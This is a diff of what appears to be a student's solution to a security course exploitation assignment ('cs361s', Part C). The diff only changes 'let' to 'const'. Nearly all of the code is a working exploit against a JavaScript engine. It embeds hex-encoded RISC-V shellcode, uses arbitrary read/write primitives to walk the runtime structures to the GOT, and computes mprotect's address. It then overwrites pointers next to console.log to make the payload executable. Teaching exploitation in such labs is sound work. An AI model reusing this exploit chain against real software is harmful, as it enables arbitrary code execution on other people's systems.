@@ -1,7 +1,7 @@
 /*
  * TODO: Part C solution goes here!
  */
-let second_stage = 
+const second_stage = 
     "\xb7\x92\x39\x34\x9b\x82\x72\x7b\xb2\x02\x93\x82\xb2\x34\xb6\x02"
   + "\x93\x82\xf2\x22\x23\x3c\x51\xfe\x13\x05\x81\xff\x23\x38\x01\xfe"
   + "\x13\x06\x01\xff\x23\x34\xa1\xfe\x93\x05\x81\xfe\x93\x02\xb0\x03"
@@ -15,17 +15,17 @@ let second_stage =
  */
 
 // ctx -> rt -> js malloc usable size
-let addressconsole = cs361s.addrof(console.log);
-let ctx = cs361s.readmem(addressconsole + 48);
-let rt = cs361s.readmem(ctx + 24);
-let jsMallocUsableSize = cs361s.readmem(rt + 24);
-let auipc = cs361s.readmem(jsMallocUsableSize) >>> 12 << 12; // 20 immediate bits
+const addressconsole = cs361s.addrof(console.log);
+const ctx = cs361s.readmem(addressconsole + 48);
+const rt = cs361s.readmem(ctx + 24);
+const jsMallocUsableSize = cs361s.readmem(rt + 24);
+const auipc = cs361s.readmem(jsMallocUsableSize) >>> 12 << 12; // 20 immediate bits
 console.log(auipc);
-let load = cs361s.readmem(jsMallocUsableSize + 4) >> 20; // 12 immediate bits
+const load = cs361s.readmem(jsMallocUsableSize + 4) >> 20; // 12 immediate bits
 //GOT = game of thrones :)
-let gameofthrones = cs361s.readmem(jsMallocUsableSize + auipc + load);
+const gameofthrones = cs361s.readmem(jsMallocUsableSize + auipc + load);
 //get address of mprotect by decrementing malloc usable size address
-let addressmprotect = gameofthrones - 0x31B00;//difference between malloc and protect
+const addressmprotect = gameofthrones - 0x31B00;//difference between malloc and protect
 
 /* Populate with Second Stage Payload
  * Either mark the page that holds the second_stage string rwx or 
@@ -34,7 +34,7 @@ let addressmprotect = gameofthrones - 0x31B00;//difference between malloc and pr
  * Find where the second stage payload even is
  * look at text segment 
  */
-let secondstageaddress = cs361s.addrof(second_stage);
+const secondstageaddress = cs361s.addrof(second_stage);
 
 cs361s.writemem(addressconsole + 48, secondstageaddress);
 cs361s.writemem(addressconsole + 56, addressmprotect);
